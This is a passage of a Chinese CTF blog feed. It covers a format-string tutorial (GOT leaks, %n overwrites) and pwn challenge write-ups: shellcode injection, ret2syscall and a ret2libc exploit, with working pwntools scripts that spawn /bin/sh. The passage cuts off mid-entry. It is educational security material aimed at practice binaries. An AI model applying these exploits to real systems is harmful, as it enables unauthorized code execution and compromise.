id="泄露任意地址内存">泄露任意地址内存</h4><p>可以看到，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。<br>一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的(因为是某个函数的局部变量)。那么也就是说，在调用输出函数的时候，其实，第一个参数的值就是该格式化字符串的地址。<br>所以，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那么我们就可以通过如下方式来获取某个指定地址addr的内容。<br><code>addr%k$s</code><br><em>注：在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节</em><br>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定：<br><code>[tag]%p%p%p%p%p%p%p...</code><br>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与前面的tag重复了，那么就有很大把我说明该子地址就是格式化字符串的地址，之所以说是有很大把握，是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，再次确认。这里我们利用字符<code>A</code>作为特定字符。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6b9992ae-6702-4785-bc4b-2cbd817190ea.png" alt="alt text"><br>由0x25414141处所在的位置可以看到我们的格式化字符串的起始地址正好是输出函数的第5个参数，是格式化字符串的第4个参数，我们进行测试，发现崩溃了<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/eb3e5a2a-1201-4259-acb2-124eee70a511.png" alt="alt text"><br>这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。<br>若设置一个可访问的地址呢？如<code>scanf@got</code><br>首先，获取scanf@got的地址，如下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/01c271e5-826d-498d-b62c-07d24ff380cc.png" alt="alt text"><br>接下来利用pwntools构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  </span><br><span class="line">sh = process(<span class="string">&#x27;./leakmemory&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">leakmemory = ELF(<span class="string">&#x27;./leakmemory&#x27;</span>)  </span><br><span class="line">__isoc99_scanf_got = leakmemory.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__isoc99_scanf_got))  </span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">b&#x27;%4$s&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span>(payload)  </span><br><span class="line">gdb.attach(sh)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;%4$s\n&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>])))  </span><br><span class="line">sh.interacive()</span><br></pre></td></tr></table></figure><p>可以看到，我们的第四个参数确实指向scanf的地址<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e650c7ac-6168-40a2-b3cc-7adaa8b6857c.png" alt="alt text"><br>再看终端<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/cebcf8bf-c307-42c8-930a-3260d7913c89.png" alt="alt text"><br>我们成功获取到了scanf的地址。<br>但是，并不是所有的偏移机器字长的整数倍，可以让我们直接相应参数获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处。如：<br><code>[padding][addr]</code><br><em>注：我们不能直接在命令输入<code>\x0c\xa0\x04\x08%4$s</code>，这时因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是将<code>\,x,0,c</code>分别作为一个字符进行读入。</em></p><h3 id="覆盖内存">覆盖内存</h3><p>使用格式化字符串漏洞来修改任意地址变量的内存<br><code>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整形指针参数所指的变量。</code><br>通过这个类型参数，再加上一些小技巧，就可以实现修改其对应的数值。这里分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p><p>这里使用如下程序来学习；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> c = <span class="number">789</span>;  </span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);  </span><br><span class="line">    <span class="built_in">printf</span>(s);  </span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">16</span> ) &#123;  </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;  </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b = <span class="number">0x12345678</span>) &#123;  </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...[overwrite addr]...%[overwrite offset]$n</span><br></pre></td></tr></table></figure><p>其中…表示我们的填充内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址标识我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，有如下步骤：</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存">覆盖栈内存</h4><p><strong>确定覆盖地址</strong>：<br>首先，想办法知道栈变量C的地址。由于目前几乎所有的程序都开启了aslr保护，所以栈的地址一直在变，所以这里故意输出C变量的地址。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/e72ad714-317f-4275-b541-e57998be4604.png" alt="alt text"><br><strong>确定相对偏移</strong>：<br>其次，确认存储格式化字符串的地址是printf将要输出的第几个参数，这里通过之前泄露栈变量数值的方法进行操作。调试：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/49264858-b4be-4c58-b84a-26ba5e6e6ecf.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2bd0a8f6-4ee8-4119-9b45-1f73c7ab5ce7.png" alt="alt text"><br>在0xffffd504处存储变量c的数值。继而，我们再确定格式化字符串<code>%d%d</code>的地址0xffffd518相对于printf函数的格式化字符串参数0xffffd500的偏移为0x18，即格式化字符串相当于printf函数的第7个参数，相当于格式化字符串的第6个参数</p><p><strong>进行覆盖</strong>：<br>这样，第六个参数处的值就是存储变量c的地址，我们可以利用%n的特征来修改c的值。payload如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[addr of c]%012d%6$n</span><br></pre></td></tr></table></figure><p>addr of c的长度为4，故而我们得再输入12个字符才可以达到16个字符，以便于来修改c的值为16.<br>具体脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forc</span>():  </span><br><span class="line">    <span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]  </span></span><br><span class="line">    sh = process(<span class="string">&quot;./overflow&quot;</span>)  </span><br><span class="line">    c_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(c_addr))  </span><br><span class="line">    payload = p32(c_addr) + <span class="string">b&#x27;%012d&#x27;</span> + <span class="string">b&#x27;%6$n&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(payload)  </span><br><span class="line">    <span class="comment"># gdb.attach(sh)  </span></span><br><span class="line">    sh.sendline(payload)  </span><br><span class="line">    <span class="built_in">print</span>(sh.recv())  </span><br><span class="line">    sh.interactive()  </span><br><span class="line">  </span><br><span class="line">forc()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/f68d694d-77b1-46a0-8afb-96fde487ef18.png" alt="alt text"></p><h4 id="覆盖任意地址内存">覆盖任意地址内存</h4><p><strong>覆盖小数字</strong>：<br>首先，来考虑一下如何修改data段的变量为一个较小的数字，比如说，<em>小于机器字长的数字</em>。这里以2为例。可能会觉得没有什么区别，如果我们将要覆盖的地址放在最前面，那么将直接占用机器字长个(4或8)字节。显然，无论之后如何输出，都只会比4大。<br>或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。<br>我们当时只是为了寻找偏移，所以才把tag放在字符串的最前面，如果我们把tag放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以到的对应的数值。前面已经说了格式化字符串的为第6个参数。由于我们想要把2写到对应的地址处，故而格式化字符串的前面的字节必须是<br><code>aa%k$nxx</code><br>此时对应的存储的格式化字符串已经占据了6个字符的位置，如果我们再添加两个字符aa，那么aa%k就是第六个参数，$nxx其实就是第7个参数，后面如果跟上要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。<br>利用ida可以得到a的地址为</p>]]></content>
    
    
    <summary type="html">pwn入门之路二，格式化字符串！！！</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
    <category term="CTF,网安,pwn" scheme="https://www.xvzhang.fun/tags/CTF-%E7%BD%91%E5%AE%89-pwn/"/>
    
  </entry>
  
  <entry>
    <title>moectf_pwn</title>
    <link href="https://www.xvzhang.fun/posts/ed364894.html"/>
    <id>https://www.xvzhang.fun/posts/ed364894.html</id>
    <published>2025-05-07T02:59:47.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>感谢<a href="https://ctf.xidian.edu.cn/">西电ctf平台</a></strong></p><h1>ez_shellcode</h1><p>肆意溢出并构造shellcode吧！<br>checksec查保护，运行<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/418f8257-1f51-448d-88f4-eaf7d5d8ea0b.png" alt="alt text"><br>发现值开启了PIE保护，程序允许输入并输出一段地址，放入ida中反编译瞅瞅<br>漏洞点在fun()函数中<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b06ba4e4-ec74-4f73-afb1-6e511eb6ad77.png" alt="alt text"><br>可以看到，read函数的接受值可以由用户进行控制的，同时会打印出nbytes_4的地址，最后将nbytes_4读入。我们想要的是利用read函数打栈溢出，造成ret2shellcode。<br>这里我们可以控制读入shellcode到程序输出的地址，就是nbytes_4的地址，将payload写入，然后执行即可。<br>我们来计算造成栈溢出的偏移量为96<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/8181f36c-8318-4e93-8033-f28747a209ff.png" alt="alt text"><br>可以看到，nbytes_4段可读可写可执行<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ae0ea8da-9458-4de4-a7de-13a0e4685d8b.png" alt="alt text"><br>编写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;age&#x27;</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;200&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;you :\n&#x27;</span>)  </span><br><span class="line">buf_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)  </span><br><span class="line">log.success(buf_addr)  </span><br><span class="line">log.success(<span class="built_in">type</span>(buf_addr))  </span><br><span class="line">payload = asm(shellcraft.sh()).ljust((<span class="number">0x60</span> + <span class="number">0x08</span>), <span class="string">b&#x27;a&#x27;</span>) + p64(buf_addr)  </span><br><span class="line">sh.recvuntil(<span class="string">&quot;say&quot;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功本地打通：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/010aa99b-f001-403b-8b75-bb91e3f404f9.png" alt="alt text"><br>打远程<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4a0f040b-aaf1-48b6-81ab-d9dac8426400.png" alt="alt text"></p><h1>NotEnoughTime</h1><p>在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力…</p><p>连接远程环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> math  </span><br><span class="line">  </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">43425</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&quot;Test start, you have only 30 seconds.\nLet&#x27;s begin with simple ones.\n&quot;</span>)  </span><br><span class="line">title = sh.recvuntil(<span class="string">&#x27;=&#x27;</span>).strip().decode()[:-<span class="number">1</span>]  </span><br><span class="line">result = <span class="built_in">eval</span>(title)  </span><br><span class="line">sh.sendline(<span class="built_in">str</span>(result))  </span><br><span class="line">title = sh.recvuntil(<span class="string">&#x27;=&#x27;</span>).strip().decode()[:-<span class="number">1</span>]  </span><br><span class="line">result = math.floor(<span class="built_in">eval</span>(title))  </span><br><span class="line">sh.sendline(<span class="built_in">str</span>(result))  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK, then some tough ones. Be WELL PREPARED!\n&#x27;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  </span><br><span class="line">    title = sh.recvuntil(<span class="string">&#x27;=&#x27;</span>).strip().decode()[:-<span class="number">1</span>]  </span><br><span class="line">    title = title.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;    &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;title&quot;</span>,title)  </span><br><span class="line">    result = math.floor(<span class="built_in">eval</span>(title))  </span><br><span class="line">    <span class="built_in">print</span>(result)  </span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(result))</span><br></pre></td></tr></table></figure><h1>这是什么？32-bit！</h1><p>Linux 遵循的 AMD64 System V ABI 使用 6 个寄存器（rdi、rsi…）传递函数参数，参数数量大于 6 个时才继续使用栈传递参数。然而 32 位程序只使用栈传递参数，参数从右至左依次入栈。</p><p>checksec+运行，32位程序，只开启NX保护，要求输入<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/bd0b7449-bfb9-47e1-8bcc-774290aec3f0.png" alt="alt text"><br>输入过长明文会崩溃<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c4343c49-dd6e-4aaa-bc97-0af522f600f8.png" alt="alt text"><br>使用ida打开查看，发现vuln函数，查看：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/116d8f81-908d-4646-baa8-fb530701c809.png" alt="alt text"><br>发现backdoor函数，查看,为后门函数，但是好像有点不对劲，fakefalg是什么鬼，本题的目的应该是需要拿shell的：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5dc49e65-b3df-4679-b052-8105d98f4852.png" alt="alt text"><br>发现存在scanf的栈溢出漏洞，关于<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">scanf栈溢出</a>，这里正好是<code>scanf(&quot;%s&quot;,s)</code>，所以我们可以打栈溢出到backdoor函数。<br>计算偏移为41，因为回车符也会被录入，所以这里的实际偏移为<code>40</code>：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6340c73e-b5f1-46a3-86e2-e0e214a562a9.png" alt="alt text"><br>使用ROPgadget查到execve函数及binsh地址为：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7d04a806-4b81-4d90-8886-0304af47eda5.png" alt="alt text"><br>这里既然有execve，那么则是让我们打ret2syscall<br>编写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./backdoor&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./backdoor&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">execve_addr = <span class="number">0x080490A0</span>  </span><br><span class="line">bin_sh = <span class="number">0x0804a011</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># payload = flat([  </span></span><br><span class="line"><span class="comment">#     b&#x27;a&#x27; * (0x28 + 0x04), elf.sym[b&#x27;execve&#x27;], 0, next(elf.search(b&#x27;/bin/sh&#x27;)), 0, 0  </span></span><br><span class="line"><span class="comment"># ])  </span></span><br><span class="line">payload = flat([  </span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x04</span>), execve_addr, <span class="number">0</span>, bin_sh, <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">])  </span><br><span class="line">sh.sendline()  </span><br><span class="line">gdb.attach(sh)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Enter the password: &#x27;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>中间出了点小问题，脑袋抽抽了用ROPgadget查了execve的地址用上了，我说怎么打不通。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a37d13d2-ebbd-4589-943b-725860861eb9.png" alt="alt text">差点踩坑里<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1863ce98-aff6-4577-9054-4abe0ac52476.png" alt="alt text"></p><h1>TGCTF-签到</h1><p>写不出来？回家吧孩子，回家吧<br>ret2libc，给出了所用的libc版本。<br>使用checksec查保护。64位程序，仅开启NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/99928f05-6609-4b8e-b8bd-4daf3c2fb106.png" alt="alt text"><br>使用ida反编译进行审计，发现程序内无<code>system('/bin/sh)</code>，漏洞点在gets函数栈溢出，并且存在puts函数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c9ea9fb3-5cf7-4bb1-bd2b-501da5a42fbf.png" alt="alt text"><br>对于无<code>system</code>与<code>/bin/sh</code>的情况，参考下面大佬的文章：<br><a href="https://starrysky1004.github.io/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/">《重生之我在yctu做pwn手》系列视频笔记</a><br>因为本题中存在puts函数，所以我们这里泄露puts函数的地址来计算libc的基地址，从而构造<code>system('/bin/sh')</code>。<br>计算偏移<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/98c749f2-b4a9-4507-b2da-9a0afe1a05d8.png" alt="alt text"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&quot;127.0.0.1&quot;, 42581)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">pop_rdi_ret = <span class="number">0x0401176</span>  </span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x08</span>)  </span><br><span class="line">p1 += p64(pop_rdi_ret)  </span><br><span class="line">p1 += p64(puts_got)  </span><br><span class="line">p1 += p64(puts_plt)  </span><br><span class="line">p1 += p64(main)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#gdb.attach(sh)  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main))  </span><br><span class="line">sh.sendline(p1)  </span><br><span class="line">  </span><br><span class="line">libc_base =  u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>, <span class="built_in">hex</span>(libc_base))  </span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base  </span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__() + libc_base  </span><br><span class="line">  </span><br><span class="line">p2 = <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x08</span>)  </span><br><span class="line">p2 += p64(pop_rdi_ret)  </span><br><span class="line">p2 += p64(bin_sh)  </span><br><span class="line">p2 += p64(<span class="number">0x40101a</span>)  </span><br><span class="line">p2 +=  p64(system)  </span><br><span class="line">sh.sendline(p2)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>不知道为什么，我在做的时候一直会卡在这一步，导致我一直以为我的exp是错误的，一直改改改，😭。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c0b64e57-86a7-4f6b-ac85-a0de05c4dd21.png" alt="alt text"><br>最后看到大佬发的wp，对照了一下，没问题，于是多跑了几遍，才出来。😡</p><h1>TGCTF-overflow</h1><p>最简单的溢出了，应该把它设置成签到的</p><p>checksec查保护，32位程序，发现开启了NX与canary保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/89692ed2-0ba1-4302-aaa1-d7b6c24ac1c6.png" alt="alt text"><br>使用ida反编译后发现，该程序使用静态链接，使用<code>ldd</code>确定：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4e1cc902-b8df-4b2a-a0e8-30fa40a164bc.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/f4aec1aa-2420-46bb-b7a0-1f48c1f58ddf.png" alt="alt 